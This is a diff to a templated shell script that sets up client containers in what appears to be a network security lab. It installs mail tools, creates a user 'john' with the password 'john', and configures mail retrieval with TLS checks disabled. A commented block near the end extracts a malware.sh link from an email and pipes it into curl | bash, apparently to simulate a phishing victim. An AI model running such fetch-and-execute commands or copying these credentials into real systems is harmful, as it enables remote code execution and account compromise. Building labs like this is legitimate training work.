@@ -5,9 +5,104 @@
 {% for k in range(1, LANadmins | int +1 ) %}
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "nameserver 1.1.1.1
 nameserver 8.8.8.8" > /etc/resolv.conf'
-docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN apk --no-cache add curl samba-client bash openssh sshpass lftp
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN apk --no-cache add curl samba-client bash openssh sshpass lftp busybox-extras python2
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip addr add 192.168.20.{{k+1}}/24 dev eth1
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip route delete default
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sysctl net.ipv6.conf.all.disable_ipv6=1
 docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN ip route add 0.0.0.0/0 via 192.168.20.1 dev eth1
+
+{# 
+oldddddddddddddddddd
+
+
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN apk --no-cache add mutt
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'echo "
+# About Me                                                                                                                 
+set from = "john@Server6-mail-DMZ"                                                                                         
+set realname = "john"                                                                                                      
+                                                                                                                           
+# My credentials                                                                                                           
+set smtp_url = "smtp://john@Server6-mail-DMZ@172.16.0.7:25/"                                                        
+set smtp_pass = "john"                                                                                                    
+                                                                                                                           
+set spoolfile=imaps://172.16.0.7:993/INBOX                                                                                                                                                         
+set imap_user=john                                                                                                         
+set imap_pass=john                                                                                                         
+set imap_servernoise=yes                                                                                                   
+                                                                                                                           
+                                                                                                                           
+set mbox_type=Maildir                                                                                                      
+set folder="~/Maildir"                                                                                                     
+set mask="!^\.[^.]"                                                                                                        
+set mbox="~/Maildir"                                                                                                       
+set record="+.Sent"                                                                                                        
+set postponed="+.Drafts"                                                                                                                                                                                                         
+                                                                                                                                                                                                                                             
+# Where to put the stuff                                                                                                   
+set header_cache = "~/.mutt/cache/headers"                                                                                 
+set message_cachedir = "~/.mutt/cache/bodies"                                                                              
+set certificate_file = "~/.mutt/certificates" 
+                                                                                                                         
+# Etc                                                                                                                      
+set mail_check = 30                                                                                                        
+set move = no                                                                                                              
+set imap_keepalive = 30                                                                                                    
+set sort = threads                                                                                                         
+set editor = "vi"                                                                                                          
+                                                                                                                           
+unset ssl_usesystemcerts    # toggle global cert checking (good for saving local certs)                                    
+unset ssl_verify_host" >> /etc/Muttrc'            
+
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'echo "
+poll mail.DMZsite.dev with proto IMAP
+  user 'john' there with password 'john' is 'root@localhost' here
+  ssl fetchall no sslcertck" > /etc/fetchmailrc' 
+
+oldddddddddddddddddd   
+#}
+
+docker exec -d clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "nameserver 172.16.0.5" > /etc/resolv.conf'
+
+
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN adduser john --gecos "" --disabled-password
+docker exec clab-{{networkname}}-Client{{k}}-ADMINS-LAN sh -c 'echo "john:john" | chpasswd'
+
+docker exec --workdir /getmail-5.16/getmail-5.16 clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'python setup.py install'
+
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/.getmail'
+
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'echo "[retriever]  
+type = SimpleIMAPSSLRetriever
+server = mail.DMZsite.dev
+username = john              
+port = 993
+password = john    
+mailboxes = (\"INBOX\",)
+ 
+[destination]
+type = Maildir     
+path = ~/Maildir/              
+destinations = (\"~/Maildir/\", )
+                               
+[options]                      
+read_all = false    
+delete_after = 30
+delivered_to = false
+received = true     
+verbose = 1         
+message_log = ~/.getmail/log" > ~/.getmail/getmailrc'
+
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/tmp'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/cur'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/new'
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c 'mkdir ~/Maildir/old'
+
+docker exec -d --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN bash -c "nohup bash retrieveMail.sh &"
+{#
+docker exec --user john clab-{{networkname}}-Client{{k}}-ADMINS-LAN getmail
+john=$(ls -Altr ~/Maildir/new | tail -1 | awk '{print $9}')
+grep -o "http://10.0.0.3:8000/malware.sh" ~/Maildir/new/$john|  xargs curl | bash
+#} 
+
 {% endfor %}
